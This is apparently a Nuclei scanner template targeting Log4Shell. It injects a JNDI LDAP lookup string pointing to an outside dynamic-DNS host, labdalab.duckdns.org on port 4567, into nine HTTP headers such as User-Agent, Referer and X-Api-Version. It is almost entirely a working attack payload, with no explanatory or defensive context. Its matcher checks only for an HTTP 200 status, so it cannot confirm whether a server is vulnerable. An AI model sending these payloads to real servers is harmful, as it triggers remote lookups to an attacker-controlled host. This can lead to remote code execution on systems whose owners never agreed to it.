# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: Labda_rce_apache

info:
  name: Labda rce
  author: Labda
  severity: info
  description: Log4Shell
  tags: web, rce,

http:
  - raw:
      - |+
        GET / HTTP/1.1
        {{header}}: ${jndi:ldap://labdalab.duckdns.org:4567/a}
    payloads:
      header:
        - User-Agent
        - Date
        - Content-Type
        - Content-Encoding
        - Pragma
        - Cache-Control
        - Origin
        - Referer
        - X-Api-Version
    attack: batteringram
    unsafe: true
    matchers:
        - type: status
          status:
            - 200
